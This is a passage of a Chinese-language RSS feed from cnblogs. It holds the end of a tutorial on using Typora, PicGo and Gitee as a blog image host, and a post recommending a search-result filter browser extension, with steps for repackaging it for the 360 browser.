&lt;p&gt;安装好后，图床设置下面将会出现Gitee选项&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/xp-thebest/blog_img/raw/master/img/image-20210125230447778.png&quot; alt=&quot;图床设置&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;详细配置内容如下，配置好确定即可&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/xp-thebest/blog_img/raw/master/img/image-20210125231009344.png&quot; alt=&quot;Gitee设置&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;Typora配置&lt;/p&gt;
&lt;p&gt;文件 --- 偏好设置 --- 图像&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/xp-thebest/blog_img/raw/master/img/image-20210125231450547.png&quot; alt=&quot;Typora设置&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/xp-thebest/blog_img/raw/master/img/image-20210125231516392.png&quot; alt=&quot;验证上传&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;注意，粘贴图片的时候，不要先改图片名字，先上传，后改名字，因为上传后一般自动命名格式是时间类型，重复概率很小，以放自己改名字再上传可能会重复重复&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;到此，粘贴到 Typora 的图片会提示上传，也可以右键自己选择上传，上传后即可复制到博客中直接使用，注意使用的时候PicGo要后台启动着，不然会报错，如遇到问题，可评论可私信&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;​&lt;/p&gt;
</description>
<pubDate>Mon, 25 Jan 2021 15:17:00 +0000</pubDate>
<dc:creator>noor9</dc:creator>
<og:description>Typora+PicGo+Gitee打造自己的一个博客图片图床</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/xp-thebest/p/14328023.html</dc:identifier>
</item>
<item>
<title>分享一个浏览器插件：搜索引擎结果过滤器 - 机器学习算法与Python</title>
<link>http://www.cnblogs.com/jpld/p/14327879.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jpld/p/14327879.html</guid>
<description>&lt;p&gt;大家在写代码时免不了出bug，就需要用搜索引擎找解决方法。&lt;/p&gt;
&lt;p&gt;某些技术网站非常垃圾（下面有点名），排版差，内容质量堪忧。但是这些网站却靠着SEO常常占据搜索结果页的首页，不小心点进去就纯浪费时间。&lt;/p&gt;
&lt;p&gt;今天向大家推荐一款我正在使用的浏览器扩展程序——search-engine-filter（搜索引擎页面内容过滤）&lt;/p&gt;
&lt;p&gt;它可以过滤掉百度或Google搜索结果页面我们不想看到的网站，大幅提升工作效率。&lt;/p&gt;
&lt;h2 id=&quot;安装方法&quot;&gt;安装方法&lt;/h2&gt;
&lt;p&gt;可以直接再Chrome扩展程序搜索：search-engine-filter&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#网址
chrome://extensions/
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;大家也可以通过在输入框中输入自定义的过滤规则，将自己讨厌的不想看到的搜索内容过滤掉。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://my-wechat.oss-cn-beijing.aliyuncs.com/image_20210119170459.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;也可以在search-engine-filter图标点击右键-选项管理过滤的网站&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://my-wechat.oss-cn-beijing.aliyuncs.com/image_20210120143456.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下图为我在使用过程中添加的垃圾编程网站，想省事的同学可以照抄一份。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://my-wechat.oss-cn-beijing.aliyuncs.com/image_20210120144257.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;从chrome到360极速&quot;&gt;从Chrome到360极速&lt;/h2&gt;
&lt;p&gt;有同学就要说了，Chrome扩展插件需要墙外才能下载，而且也不喜欢Chrome浏览器，如何是好？&lt;/p&gt;
&lt;p&gt;第一步，在Chrome扩展程序中心打开开发者模式，选择search-engine-filter&lt;br/&gt;&lt;img src=&quot;https://my-wechat.oss-cn-beijing.aliyuncs.com/image_20210119180432.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;第二步，记住ID，选择打包扩展程序&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://my-wechat.oss-cn-beijing.aliyuncs.com/image_20210119180546.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;路径选择：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Extensions\clkhhmchimakdcfbdohhnkjlljkimmgi\1.0.6_0
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://my-wechat.oss-cn-beijing.aliyuncs.com/image_20210119180639.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;第三步，打开360极速浏览器的扩展程序，打开开发者模式&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;chrome://myextensions/extensions
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;双击打开1.0.6_0.crx，即完成安装。&lt;br/&gt;其他浏览器配置方法类似。&lt;/p&gt;
&lt;p&gt;我已经将crx文件保存到云盘，大家可以直接去下载！&lt;br/&gt;&lt;img src=&quot;https://my-wechat.oss-cn-beijing.aliyuncs.com/image_20210119181025.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;center&gt;扫描上方二维码&lt;/center&gt;
&lt;center&gt;回复【&lt;span&gt;搜索扩展&lt;/span&gt;】&lt;/center&gt;
</description>
<pubDate>Mon, 25 Jan 2021 14:44:00 +0000</pubDate>
<dc:creator>机器学习算法与Python</dc:creator>
<og:description>大家在写代码时免不了出bug，就需要用搜索引擎找解决方法。 某些技术网站非常垃圾（下面有点名），排版差，内容质量堪忧。但是这些网站却靠着SEO常常占据搜索结果页的首页，不小心点进去就纯浪费时间。 今天</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/jpld/p/14327879.html</dc:identifier>
</item>
</channel>
</rss>